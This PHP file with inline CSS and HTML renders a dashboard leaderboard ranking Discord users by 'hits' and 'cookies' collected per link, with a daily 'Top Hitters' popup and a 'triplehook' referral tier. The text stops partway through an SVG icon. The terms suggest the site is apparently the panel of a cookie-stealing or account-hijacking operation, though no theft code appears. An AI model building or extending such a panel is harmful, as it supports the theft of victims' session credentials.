<?php
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
if (!function_exists('ultimaAuthenticatedRegular')) {
    function ultimaAuthenticatedRegular()
    {
        static $authenticatedUser = null;
        if (is_array($authenticatedUser)) {
            return $authenticatedUser;
        }
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_name('token');
            if (!session_start()) {
                return null;
            }
        }
        if (session_name() !== 'token' || !function_exists('executeSafeQuery')) {
            return null;
        }
        $authCode = trim((string)($_SESSION['auth_code'] ?? ''));
        if ($authCode === '') {
            return null;
        }
        try {
            $rows = executeSafeQuery(
                'SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 2',
                [':auth_code' => $authCode]
            );
        } catch (\Throwable $e) {
            return null;
        }
        if (!is_array($rows) || count($rows) !== 1 || !is_array($rows[0])) {
            return null;
        }
        $row = $rows[0];
        $storedAuthCode = (string)($row['auth_code'] ?? '');
        $resolvedLinkId = (int)($row['link_id'] ?? 0);
        if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $resolvedLinkId <= 0) {
            return null;
        }
        $authenticatedUser = $row;
        return $authenticatedUser;
    }
}

if (empty($userData) || !is_array($userData) || (int)($userData['link_id'] ?? 0) <= 0) {
    $userData = function_exists('ultimaAuthenticatedRegular') ? ultimaAuthenticatedRegular() : null;
}
if (!is_array($userData)) {
    http_response_code(401);
    exit;
}
if (!function_exists('dashWidgetQuery')) {
    function dashWidgetQuery($sql, $params = [], $ttl = 60) {
        if (function_exists('ultimaPageQuery')) {
            return ultimaPageQuery($sql, $params, $ttl);
        }
        if (function_exists('executeSafeQuery')) {
            return executeSafeQuery($sql, $params);
        }
        return [];
    }
}


$link_id = (int)$userData['link_id'];
$linkId = $link_id;
$isTriplehook = (int)($userData['triplehook'] ?? 0) === 1;
$triplehookLeaderboard=[];
$referredBy = (int)($userData['referred_by'] ?? 0);

if($isTriplehook){
    $currentLinkId = $link_id;
    if($currentLinkId > 0){
        if($referredBy > 0){
            $triplehookQuery="SELECT r.discord_username, r.discord_avatar, r.discord_id, r.avatar_hidden, td.link_id,
                              (SELECT COUNT(*) FROM regular r2 WHERE r2.referred_by = td.link_id) as total_users
                              FROM triplehook_data td
                              INNER JOIN regular r ON r.link_id = td.link_id
                              WHERE r.discord_username IS NOT NULL
                              AND r.referred_by = :referred_by
                              ORDER BY total_users DESC
                              LIMIT 10";
            $result = dashWidgetQuery($triplehookQuery,[':referred_by' => $referredBy]);
        }else{
            $triplehookQuery="SELECT r.discord_username, r.discord_avatar, r.discord_id, r.avatar_hidden, td.link_id,
                              (SELECT COUNT(*) FROM regular r2 WHERE r2.referred_by = td.link_id) as total_users
                              FROM triplehook_data td
                              INNER JOIN regular r ON r.link_id = td.link_id
                              WHERE r.discord_username IS NOT NULL
                              ORDER BY total_users DESC
                              LIMIT 10";
            $result = dashWidgetQuery($triplehookQuery,[]);
        }
        $triplehookLeaderboard = is_array($result) ? $result : [];
    }
}

if($referredBy > 0){
    $leaderboardQuery="SELECT r.link_id, r.discord_username, r.discord_avatar, r.discord_id, r.avatar_hidden, COUNT(h.id) as total_cookies 
                       FROM regular r 
                       LEFT JOIN hits h ON r.link_id = h.link_id 
                       WHERE r.discord_username IS NOT NULL 
                       AND r.referred_by = :referred_by
                       GROUP BY r.link_id, r.discord_username, r.discord_avatar, r.discord_id, r.avatar_hidden 
                       ORDER BY total_cookies DESC 
                       LIMIT 10";
    $leaderboardResult=dashWidgetQuery($leaderboardQuery,[':referred_by' => $referredBy]);
    if(!is_array($leaderboardResult)) $leaderboardResult=[];

    $todayStart = date('Y-m-d 00:00:00');
    $todayHittersQuery="SELECT r.link_id, r.discord_username, r.discord_avatar, r.discord_id, r.avatar_hidden, COUNT(h.id) as today_hits 
                        FROM hits h
                        INNER JOIN regular r ON r.link_id = h.link_id 
                        WHERE r.discord_username IS NOT NULL 
                        AND r.referred_by = :referred_by
                        AND h.created_at >= :today_start
                        GROUP BY r.link_id, r.discord_username, r.discord_avatar, r.discord_id, r.avatar_hidden 
                        HAVING today_hits > 0
                        ORDER BY today_hits DESC 
                        LIMIT 3";
    $todayHitters=dashWidgetQuery($todayHittersQuery,[':referred_by' => $referredBy, ':today_start' => $todayStart]);
    if(!is_array($todayHitters)) $todayHitters=[];
}else{
    $topHits = dashWidgetQuery(
        "SELECT link_id, COUNT(*) as total_cookies FROM hits GROUP BY link_id ORDER BY total_cookies DESC LIMIT 10",
        [],
        90
    );
    $leaderboardResult = [];
    if (!empty($topHits)) {
        $ids = array_values(array_filter(array_map(static function ($row) {
            return (int)($row['link_id'] ?? 0);
        }, $topHits)));
        $byId = [];
        foreach ($topHits as $row) {
            $byId[(int)$row['link_id']] = (int)$row['total_cookies'];
        }
        if ($ids) {
            $in = implode(',', $ids);
            $users = dashWidgetQuery(
                "SELECT link_id, discord_username, discord_avatar, discord_id, avatar_hidden FROM regular WHERE link_id IN ($in) AND discord_username IS NOT NULL",
                [],
                90
            );
            foreach ($users as $u) {
                $lid = (int)$u['link_id'];
                $u['total_cookies'] = $byId[$lid] ?? 0;
                $leaderboardResult[] = $u;
            }
            usort($leaderboardResult, static function ($a, $b) {
                return ((int)$b['total_cookies']) <=> ((int)$a['total_cookies']);
            });
        }
    }

    $todayStart = date('Y-m-d 00:00:00');
    $todayHittersQuery="SELECT r.link_id, r.discord_username, r.discord_avatar, r.discord_id, r.avatar_hidden, COUNT(h.id) as today_hits 
                        FROM hits h
                        INNER JOIN regular r ON r.link_id = h.link_id 
                        WHERE r.discord_username IS NOT NULL 
                        AND h.created_at >= :today_start
                        GROUP BY r.link_id, r.discord_username, r.discord_avatar, r.discord_id, r.avatar_hidden 
                        HAVING today_hits > 0
                        ORDER BY today_hits DESC 
                        LIMIT 3";
    $todayHitters=dashWidgetQuery($todayHittersQuery,[':today_start' => $todayStart]);
    if(!is_array($todayHitters)) $todayHitters=[];
}

function getAvatarUrlLB($avatar, $discordId) {
    if (empty($avatar)) return '';
    if (strpos($avatar, 'https://') === 0) return $avatar;
    if (strpos($avatar, '/images/') === 0) return $avatar;
    if (empty($discordId)) return '';
    $ext = (strpos($avatar, 'a_') === 0) ? 'gif' : 'png';
    return 'https://cdn.discordapp.com/avatars/' . $discordId . '/' . $avatar . '.' . $ext;
}
?>
<style>
.leaderboards-card{position:relative;background:transparent}
.leaderboards-header{margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;position:relative}
.leaderboards-header h2{font-size:1rem;display:flex;align-items:center;gap:8px;color:#fff;text-shadow:none}
.leaderboards-list{max-height:340px;min-height:340px;overflow-y:auto;padding-right:8px;-webkit-overflow-scrolling:touch}
.leaderboards-list::-webkit-scrollbar{width:6px}
.leaderboards-list::-webkit-scrollbar-track{background:rgba(255,255,255,0.02);border-radius:10px}
.leaderboards-list::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.08);border-radius:10px}
.leaderboards-list::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,0.14)}
.leaderboard-row{display:flex;justify-content:flex-start;align-items:center;padding:10px 10px 10px 0;margin-bottom:6px;background:transparent;border:none;border-radius:10px;transition:transform 0.3s ease;position:relative;overflow:hidden}
.leaderboard-row:hover{background:transparent;transform:translateX(4px);box-shadow:none}
.leaderboard-user{display:flex;align-items:center;gap:10px;flex:1;min-width:0}
.leaderboard-avatar{width:32px;height:32px;border-radius:50%;border:none;box-shadow:none;flex-shrink:0}
.leaderboard-avatar-placeholder{width:32px;height:32px;border-radius:50%;background:rgba(255,255,255,0.04);border:none;display:flex;align-items:center;justify-content:center;color:rgba(255,255,255,0.3);flex-shrink:0}
.leaderboard-username{font-family:'Rajdhani',sans-serif;font-size:0.88rem;font-weight:600;color:rgba(255,255,255,0.85);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;pointer-events:none}.leaderboard-username::after{content:attr(data-n)}
.leaderboard-score{display:flex;align-items:center;gap:6px;font-family:'Rajdhani',sans-serif;font-size:0.92rem;font-weight:700;color:#fff;flex-shrink:0;margin-left:auto}
.leaderboard-score i{font-size:0.85rem;color:rgba(255,255,255,0.7)}
.leaderboard-score svg{color:rgba(255,255,255,0.85);width:15px;height:15px}
.leaderboard-score.referrals{color:#fff}
.leaderboard-score.referrals i{color:rgba(255,255,255,0.7)}
.no-data{text-align:center;padding:20px 15px;color:rgba(255,255,255,0.25);font-size:0.8rem;letter-spacing:.5px}
.today-hitters-btn{width:26px;height:26px;background:transparent;border:1px solid rgba(255,255,255,0.07);border-radius:6px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:border-color 0.4s ease, background 0.4s ease;flex-shrink:0}
.today-hitters-btn:hover{background:rgba(255,255,255,0.02);border-color:rgba(255,255,255,0.15)}
.today-hitters-btn .bar-icon{display:flex;flex-direction:column;gap:3px}
.today-hitters-btn .bar-icon span{display:block;height:2px;background:rgba(255,255,255,0.6);border-radius:2px;transition:all 0.4s cubic-bezier(0.4,0,0.2,1)}
.today-hitters-btn .bar-icon span:nth-child(1){width:10px}
.today-hitters-btn .bar-icon span:nth-child(2){width:7px}
.today-hitters-btn .bar-icon span:nth-child(3){width:10px}
.today-hitters-btn.active .bar-icon span{background:#fff}
.today-hitters-btn.active .bar-icon span:nth-child(1){transform:rotate(45deg) translate(2px,3px);width:12px}
.today-hitters-btn.active .bar-icon span:nth-child(2){opacity:0;width:0}
.today-hitters-btn.active .bar-icon span:nth-child(3){transform:rotate(-45deg) translate(2px,-3px);width:12px}
.today-popup-overlay{position:fixed;top:0;left:0;right:0;bottom:0;z-index:2000;opacity:0;visibility:hidden;pointer-events:none}
.today-popup-overlay.show{opacity:1;visibility:visible}
.today-popup{position:absolute;top:100%;right:0;margin-top:8px;transform-origin:top right;background:rgba(10,10,14,0.6);backdrop-filter:blur(20px) saturate(1.3);-webkit-backdrop-filter:blur(20px) saturate(1.3);border:1px solid rgba(255,255,255,0.07);border-radius:14px;padding:0;z-index:2001;width:280px;max-height:350px;opacity:0;visibility:hidden;transform:translateY(-20px);overflow:hidden;box-shadow:none}
.today-popup.show{animation:popupSlideIn 0.9s ease forwards}
.today-popup.hiding{animation:popupSlideOut 0.9s ease forwards}
@keyframes popupSlideIn{0%{opacity:0;visibility:hidden;transform:translateY(-20px)}1%{visibility:visible}100%{opacity:1;visibility:visible;transform:translateY(0)}}
@keyframes popupSlideOut{0%{opacity:1;visibility:visible;transform:translateY(0)}99%{visibility:visible}100%{opacity:0;visibility:hidden;transform:translateY(-20px)}}
.today-popup-head{display:flex;align-items:center;justify-content:space-between;padding:16px 18px 12px}
.today-popup-title{font-family:'Rajdhani',sans-serif;font-size:0.65rem;font-weight:600;color:rgba(255,255,255,0.75);letter-spacing:3px;text-transform:uppercase}
.today-popup-refresh{font-family:'Rajdhani',sans-serif;font-size:0.62rem;color:rgba(255,255,255,0.3);font-weight:500;margin-top:4px;letter-spacing:.5px}
.today-popup-refresh span{color:rgba(255,255,255,0.55);font-weight:600}
.today-popup-close{width:24px;height:24px;background:rgba(255,255,255,0.04);border:none;border-radius:6px;cursor:pointer;display:flex;align-items:center;justify-content:center;color:rgba(255,255,255,0.4);font-size:0.65rem;transition:background 0.3s ease, color 0.3s ease}
.today-popup-close:hover{background:rgba(255,255,255,0.08);color:rgba(255,255,255,0.85)}
.today-popup-columns{display:flex;justify-content:space-between;padding:0 18px 10px;border-bottom:1px solid rgba(255,255,255,0.05)}
.today-popup-columns span{font-family:'Rajdhani',sans-serif;font-size:0.58rem;font-weight:600;color:rgba(255,255,255,0.3);letter-spacing:2px;text-transform:uppercase;display:flex;align-items:center;gap:4px}
.today-popup-columns span i{font-size:0.55rem}
.today-popup-list{padding:8px 10px 12px;max-height:240px;overflow-y:auto}
.today-popup-list::-webkit-scrollbar{width:4px}
.today-popup-list::-webkit-scrollbar-track{background:transparent}
.today-popup-list::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.08);border-radius:4px}
.today-row{display:flex;align-items:center;justify-content:space-between;padding:8px 8px;border-radius:8px;transition:background 0.3s ease}
.today-row:hover{background:rgba(255,255,255,0.02)}
.today-row-user{display:flex;align-items:center;gap:10px;flex:1;min-width:0}
.today-row-avatar{width:26px;height:26px;border-radius:50%;flex-shrink:0;object-fit:cover}
.today-row-avatar-placeholder{width:26px;height:26px;border-radius:50%;background:rgba(255,255,255,0.04);display:flex;align-items:center;justify-content:center;flex-shrink:0}
.today-row-avatar-placeholder i{font-size:0.6rem;color:rgba(255,255,255,0.3)}
.today-row-name{font-family:'Rajdhani',sans-serif;font-size:0.8rem;font-weight:600;color:rgba(255,255,255,0.85);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;pointer-events:none}.today-row-name::after{content:attr(data-n)}
.today-row-hits{font-family:'Rajdhani',sans-serif;font-size:0.85rem;font-weight:700;color:#fff;flex-shrink:0;min-width:35px;text-align:right;letter-spacing:.3px}
.today-row-avatar-wrap{position:relative;flex-shrink:0}
.today-rank-badge{position:absolute;top:-5px;right:-5px;font-size:0.65rem;z-index:2;filter:drop-shadow(0 1px 3px rgba(0,0,0,0.5))}
.today-row[data-rank="1"] .today-rank-badge{color:#ff4444}
.today-row[data-rank="2"] .today-rank-badge{color:#4a9eff}
.today-row[data-rank="3"] .today-rank-badge{color:#ffd700}
.lb-avatar-wrap{position:relative;flex-shrink:0}
.lb-avatar-wrap .leaderboard-avatar,.lb-avatar-wrap .leaderboard-avatar-placeholder{border-radius:8px;border:1.5px solid rgba(255,255,255,0.08);transition:border-color 0.3s ease}
.lb-crown{position:absolute;top:-10px;left:50%;transform:translateX(-50%);font-size:0.7rem;z-index:2;filter:drop-shadow(0 1px 3px rgba(0,0,0,0.6));display:none}
.leaderboard-row[data-rank="1"] .lb-avatar-wrap .leaderboard-avatar,.leaderboard-row[data-rank="1"] .lb-avatar-wrap .leaderboard-avatar-placeholder{border-color:rgba(255,68,68,0.5)}
.leaderboard-row[data-rank="2"] .lb-avatar-wrap .leaderboard-avatar,.leaderboard-row[data-rank="2"] .lb-avatar-wrap .leaderboard-avatar-placeholder{border-color:rgba(74,158,255,0.5)}
.leaderboard-row[data-rank="3"] .lb-avatar-wrap .leaderboard-avatar,.leaderboard-row[data-rank="3"] .lb-avatar-wrap .leaderboard-avatar-placeholder{border-color:rgba(255,215,0,0.5)}
.leaderboard-row[data-rank="1"] .lb-crown{display:block;color:#ff4444}
.leaderboard-row[data-rank="2"] .lb-crown{display:block;color:#4a9eff}
.leaderboard-row[data-rank="3"] .lb-crown{display:block;color:#ffd700}
.today-no-data{text-align:center;padding:20px 15px;color:rgba(255,255,255,0.25);font-family:'Rajdhani',sans-serif;font-size:0.72rem;letter-spacing:1px;text-transform:uppercase}
@media(max-width:768px){.leaderboards-header h2{font-size:0.95rem}.leaderboards-list{max-height:300px;min-height:auto;padding-right:5px}.leaderboard-row{padding:9px 8px}.leaderboard-avatar,.leaderboard-avatar-placeholder{width:28px;height:28px}.leaderboard-username{font-size:0.82rem}.leaderboard-score{font-size:0.85rem}.leaderboard-row:hover{transform:none}.today-popup{width:250px;right:0}}
@media(max-width:480px){.leaderboards-list{max-height:260px;min-height:auto}.leaderboard-row{padding:8px 6px;margin-bottom:5px}.leaderboard-user{gap:8px}.leaderboard-avatar,.leaderboard-avatar-placeholder{width:26px;height:26px}.leaderboard-username{font-size:0.78rem}.leaderboard-score{font-size:0.82rem;gap:4px}}
.lb-avatar-clickable{cursor:pointer;transition:transform 0.25s ease, border-color 0.25s ease}
.lb-avatar-clickable:hover{transform:scale(1.08)}
.profile-modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.65);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);z-index:5000;opacity:0;visibility:hidden;transition:opacity 0.4s ease,visibility 0.4s ease;display:flex;align-items:center;justify-content:center}
.profile-modal-overlay.show{opacity:1;visibility:visible}
.profile-modal{background:rgba(10,10,14,0.85);backdrop-filter:blur(24px) saturate(1.3);-webkit-backdrop-filter:blur(24px) saturate(1.3);border:1px solid rgba(255,255,255,0.07);border-radius:18px;width:520px;max-width:92%;padding:35px 35px 30px;position:relative;transform:scale(0.94) translateY(20px);opacity:0;transition:all 0.4s cubic-bezier(0.16,1,0.3,1)}
.profile-modal-overlay.show .profile-modal{transform:scale(1) translateY(0);opacity:1}
.profile-modal-close{position:absolute;top:14px;right:14px;background:none;border:none;cursor:pointer;color:rgba(255,255,255,0.3);font-size:1rem;transition:color 0.3s ease;padding:5px}
.profile-modal-close:hover{color:rgba(255,255,255,0.85)}
.profile-modal-header{display:flex;flex-direction:column;align-items:center;margin-bottom:28px}
.profile-modal-avatar{width:90px;height:90px;border-radius:50%;border:1px solid rgba(255,255,255,0.08);object-fit:cover;margin-bottom:14px}
.profile-modal-avatar-placeholder{width:90px;height:90px;border-radius:50%;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);display:flex;align-items:center;justify-content:center;margin-bottom:14px}
.profile-modal-avatar-placeholder i{font-size:2rem;color:rgba(255,255,255,0.3)}
.profile-modal-name{font-family:'Rajdhani',sans-serif;font-size:1.3rem;font-weight:700;color:#fff;letter-spacing:.5px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;pointer-events:none}.profile-modal-name::after{content:attr(data-n)}
.profile-modal-body{display:grid;grid-template-columns:1fr 1fr;gap:28px}
.profile-modal-section-title{font-family:'Rajdhani',sans-serif;font-size:0.65rem;font-weight:600;color:rgba(255,255,255,0.4);letter-spacing:3px;text-transform:uppercase;margin-bottom:16px}
.profile-modal-stats{display:flex;flex-direction:column;gap:10px}
.profile-stat-row{display:flex;justify-content:space-between;align-items:center;padding:6px 0}
.profile-stat-label{font-family:'Rajdhani',sans-serif;font-size:0.78rem;font-weight:600;color:rgba(255,255,255,0.55);letter-spacing:1.5px;text-transform:uppercase}
.profile-stat-dots{flex:1;border-bottom:1px dotted rgba(255,255,255,0.08);margin:0 12px;height:1px;align-self:center}
.profile-stat-value{font-family:'Rajdhani',sans-serif;font-size:0.95rem;font-weight:700;color:#fff}
.profile-rank-current{display:flex;align-items:center;gap:8px;margin-bottom:18px;font-family:'Rajdhani',sans-serif;font-size:0.85rem}
.profile-rank-current .label{color:rgba(255,255,255,0.4);letter-spacing:1.5px;text-transform:uppercase;font-size:0.7rem}
.profile-rank-current .arrow{color:rgba(255,255,255,0.25)}
.profile-rank-current .value{color:#ff4444;font-weight:700;letter-spacing:.5px}
.profile-rank-progress{margin-bottom:14px}
.profile-rank-percent{font-family:'Rajdhani',sans-serif;font-size:0.78rem;color:rgba(255,255,255,0.4);margin-bottom:8px;letter-spacing:.3px}
.profile-rank-percent span{color:rgba(255,255,255,0.85);font-weight:600}
.profile-rank-bar{width:100%;height:4px;background:rgba(255,255,255,0.05);border-radius:6px;overflow:hidden}
.profile-rank-bar-fill{height:100%;background:linear-gradient(90deg,#ff4444,#ff6b6b);border-radius:6px;transition:width 0.6s ease}
.profile-rank-next{font-family:'Rajdhani',sans-serif;font-size:0.82rem;color:rgba(255,255,255,0.4);letter-spacing:.3px}
.profile-rank-next span{color:#ff4444;font-weight:600;letter-spacing:.5px}
.profile-modal-loading{display:flex;align-items:center;justify-content:center;padding:40px;color:rgba(255,255,255,0.3);font-family:'Rajdhani',sans-serif;letter-spacing:1px;font-size:.8rem}
@media(max-width:600px){.profile-modal{padding:25px 20px 20px}.profile-modal-body{grid-template-columns:1fr;gap:22px}.profile-modal-avatar{width:70px;height:70px}.profile-modal-avatar-placeholder{width:70px;height:70px}.profile-modal-name{font-size:1.15rem}}
</style>
<?php if(!$isTriplehook): ?>
<div class="today-popup-overlay" id="todayOverlay"></div>
<?php endif; ?>
<div class="card leaderboards-card" id="leaderboards-card">
    <div class="leaderboards-header">
        <h2>Leaderboards</h2>
        <?php if(!$isTriplehook): ?>
        <button class="today-hitters-btn" id="todayBtn" onclick="toggleTodayPopup()" title="Today's Top Hitters">
            <div class="bar-icon"><span></span><span></span><span></span></div>
        </button>
        <div class="today-popup" id="todayPopup">
            <div class="today-popup-head">
                <div>
                    <div class="today-popup-title">Today's Top Hitters</div>
                    <div class="today-popup-refresh">Resets in <span id="todayCountdown">...</span></div>
                </div>
            </div>
            <div class="today-popup-columns">
                <span><i class="fas fa-user"></i> User</span>
                <span>Hits <svg style="width:16px;height:16px;vertical-align:middle;margin-left:2px" viewBox="0 0 32 32" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M 16 4 C 9.371094 4 4 9.371094 4 16 C 4 22.628906 9.371094 28 16 28 C 22.628906 28 28 22.628906 28 16 C 28 15.515625 27.964844 15.039063 27.90625 14.566406 C 27.507813 14.839844 27.023438 15 26.5 15 C 25.421875 15 24.511719 14.3125 24.160156 13.359375 C 23.535156 13.757813 22.796875 14 22 14 C 19.789063 14 18 12.210938 18 10 C 18 9.265625 18.210938 8.585938 18.558594 7.992188 C 18.539063 7.996094 18.519531 8 18.5 8 C 17.117188 8 16 6.882813 16 5.5 C 16 4.941406 16.1875 4.433594 16.496094 4.019531 C 16.332031 4.011719 16.167969 4 16 4 Z M 23.5 4 C 22.671875 4 22 4.671875 22 5.5 C 22 6.328125 22.671875 7 23.5 7 C 24.328125 7 25 6.328125 25 5.5 C 25 4.671875 24.328125 4 23.5 4 Z M 14.050781 6.1875 C 14.25 7.476563 15 8.585938 16.046875 9.273438 C 16.015625 9.511719 16 9.757813 16 10 C 16 13.308594 18.691406 16 22 16 C 22.496094 16 22.992188 15.9375 23.46875 15.8125 C 24.152344 16.4375 25.015625 16.851563 25.953125 16.96875 C 25.464844 22.03125 21.1875 26 16 26 C 10.484375 26 6 21.515625 6 16 C 6 11.152344 9.46875 7.097656 14.050781 6.1875 Z M 22 9 C 21.449219 9 21 9.449219 21 10 C 21 10.550781 21.449219 11 22 11 C 22.550781 11 23 10.550781 23 10 C 23 9.449219 22.550781 9 22 9 Z M 14 10 C 13.449219 10 13 10.449219 13 11 C 13 11.550781 13.449219 12 14 12 C 14.550781 12 15 11.550781 15 11 C 15 10.449219 14.550781 10 14 10 Z M 27 10 C 26.449219 10 26 10.449219 26 11 C 26 11.550781 26.449219 12 27 12 C 27.550781 12 28 11.550781 28 11 C 28 10.449219 27.550781 10 27 10 Z M 11 13 C 9.894531 13 9 13.894531 9 15 C 9 16.105469 9.894531 17 11 17 C 12.105469 17 13 16.105469 13 15 C 13 13.894531 12.105469 13 11 13 Z M 16 15 C 15.449219 15 15 15.449219 15 16 C 15 16.550781 15.449219 17 16 17 C 16.550781 17 17 16.550781 17 16 C 17 15.449219 16.550781 15 16 15 Z M 12.5 19 C 11.671875 19 11 19.671875 11 20.5 C 11 21.328125 11.671875 22 12.5 22 C 13.328125 22 14 21.328125 14 20.5 C 14 19.671875 13.328125 19 12.5 19 Z M 19.5 20 C 18.671875 20 18 20.671875 18 21.5 C 18 22.328125 18.671875 23 19.5 23 C 20.328125 23 21 22.328125 21 21.5 C 21 20.671875 20.328125 20 19.5 20 Z"/></svg></span>
            </div>
            <div class="today-popup-list" id="todayList">
                <?php if(!empty($todayHitters)): ?>
                    <?php foreach($todayHitters as $thIdx=>$th): 
                        $thAvatar = getAvatarUrlLB($th['discord_avatar'] ?? '', $th['discord_id'] ?? '');
                        $thDisplayName = $th['discord_username'] ?? '';
                        $thRank = $thIdx + 1;
                    ?>
                    <div class="today-row" data-rank="<?=$thRank?>" data-live-link-id="<?=htmlspecialchars((string)($th['link_id'] ?? ''), ENT_QUOTES)?>">
                        <div class="today-row-user">
                            <div class="today-row-avatar-wrap">
                                <?php if(!empty($thAvatar)): ?>
                                <img src="<?=htmlspecialchars($thAvatar)?>" class="today-row-avatar" alt="">
                                <?php else: ?>
                                <div class="today-row-avatar-placeholder"><i class="fas fa-user"></i></div>
                                <?php endif; ?>
                                <?php if($thRank <= 3): ?><span class="today-rank-badge"><i class="fas fa-skull-crossbones"></i></span><?php endif; ?>
                            </div>
                            <span class="today-row-name" data-n="<?=htmlspecialchars($thDisplayName)?>"></span>
                        </div>
                        <span class="today-row-hits"><?=number_format($th['today_hits'], 0, '.', ' ')?></span>
                    </div>
                    <?php endforeach; ?>
                <?php else: ?>
                    <div class="today-no-data">No hits today</div>
                <?php endif; ?>
            </div>
        </div>
        <?php endif; ?>
    </div>
    <div class="leaderboards-list" id="leaderboardList">
        <?php if($isTriplehook && !empty($triplehookLeaderboard)): ?>
            <?php foreach($triplehookLeaderboard as $i=>$u): 
                $avatarUrl = getAvatarUrlLB($u['discord_avatar'] ?? '', $u['discord_id'] ?? '');
                $displayName = $u['discord_username'] ?? '';
            ?>
            <div class="leaderboard-row" data-rank="<?=$i+1?>" data-live-link-id="<?=htmlspecialchars((string)($u['link_id'] ?? ''), ENT_QUOTES)?>">
                <div class="leaderboard-user">
                    <div class="lb-avatar-wrap">
                        <span class="lb-crown"><i class="fas fa-crown"></i></span>
                        <?php if(!empty($avatarUrl)): ?>
                        <img src="<?=htmlspecialchars($avatarUrl)?>" class="leaderboard-avatar lb-avatar-clickable" onclick="openProfileModal('<?=$u['link_id']??''?>','triplehook')" alt="">
                        <?php else: ?><div class="leaderboard-avatar-placeholder lb-avatar-clickable" onclick="openProfileModal('<?=$u['link_id']??''?>','triplehook')"><i class="fas fa-user"></i></div><?php endif; ?>
                    </div>
                    <span class="leaderboard-username" data-n="<?=htmlspecialchars($displayName)?>"></span>
                </div>
                <div class="leaderboard-score referrals"><i class="fas fa-users"></i><?=number_format($u['total_users'], 0, '.', ' ')?></div>
            </div>
            <?php endforeach; ?>
        <?php elseif($isTriplehook && empty($triplehookLeaderboard)): ?>
        <?php elseif(!empty($leaderboardResult)): ?>
            <?php foreach($leaderboardResult as $i=>$u): 
                $avatarUrl = getAvatarUrlLB($u['discord_avatar'] ?? '', $u['discord_id'] ?? '');
                $displayName = $u['discord_username'] ?? '';
            ?>
            <div class="leaderboard-row" data-rank="<?=$i+1?>" data-live-link-id="<?=htmlspecialchars((string)($u['link_id'] ?? ''), ENT_QUOTES)?>">
                <div class="leaderboard-user">
                    <div class="lb-avatar-wrap">
                        <span class="lb-crown"><i class="fas fa-crown"></i></span>
                        <?php if(!empty($avatarUrl)): ?>
                        <img src="<?=htmlspecialchars($avatarUrl)?>" class="leaderboard-avatar lb-avatar-clickable" onclick="openProfileModal('<?=$u['link_id']??''?>','normal')" alt="">
                        <?php else: ?><div class="leaderboard-avatar-placeholder lb-avatar-clickable" onclick="openProfileModal('<?=$u['link_id']??''?>','normal')"><i class="fas fa-user"></i></div><?php endif; ?>
                    </div>
                    <span class="leaderboard-username" data-n="<?=htmlspecialchars($displayName)?>"></span>
                </div>
                <div class="leaderboard-score"><svg style="width:18px;height:18px;vertical-align:middle;margin-right:4px" viewBox="0 0 32 32" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M 16 4 C 9.371094 4 4 9.371094 4 16 C 4 22.628906 9.371094 28 16 28 C 22.628906 28 28 22.628906 28 16 C 28 15.515625 27.964844 15.039063 27.90625 14.566406 C 27.507813 14.839844 27.023438 15 26.5 15 C 25.421875 15 24.511719 14.3125 24.160156 13.359375 C 23.535156 13.757813 22.796875 14 22 14 C 19.789063 14 18 12.210938 18 10 C 18 9.265625 18.210938 8.585938 18.558594 7.992188 C 18.539063 7.996094 18.519531 8 18.5 8 C 17.117188 8 16 6.882813 16 5.5 C 16 4.941406 16.1875 4.433594 16.496094 4.019531 C 16.332031 4.011719 16.167969 4 16 4 Z M 23.5 4 C 22.671875 4 22 4.671875 22 5.5 C 22 6.328125 22.671875 7 23.5 7 C 24.328125 7 25 6.328125 25 5.5 C 25 4.671875 24.328125 4 23.5 4 Z M 14.050781 6.1875 C 14.25 7.476563 15 8.585938 16.046875 9.273438 C 16.015625 9.511719 16 9.757813 16 10 C 16 13.308594 18.691406 16 22 16 C 22.496094 16 22.992188 15.9375 23.46875 15.8125 C 24.152344 16.4375 25.015625 16.851563 25.953125 16.96875 C 25.464844 22.03125 21.1875 26 16 26 C 10.484375 26 6 21.515625 6 16 C 6 11.152344 9.46875 7.097656 14.050781 6.1875 Z M 22 9 C 21.449219 9 21 9.449219 21 10 C 21 10.550781 21.449219 11 22 11 C 22.550781 11 23 10.550781 23 10 C 23 9.449219 22.550781 9 22 9 Z M 14 10 C 13.449219 10 13 10.449219 13 11 C 13 11.550781 13.449219 12 14 12 C 14.550781 12 15 11.550781 15 11 C 15 10.449219 14.550781 10 14 10 Z M 27 10 C 26.449219 10 26 10.449219 26 11 C 26 11.550781 26.449219 12 27 12 C 27.550781 12 28 11.550781 28 11 C 28 10.449219 27.550781 10 27 10 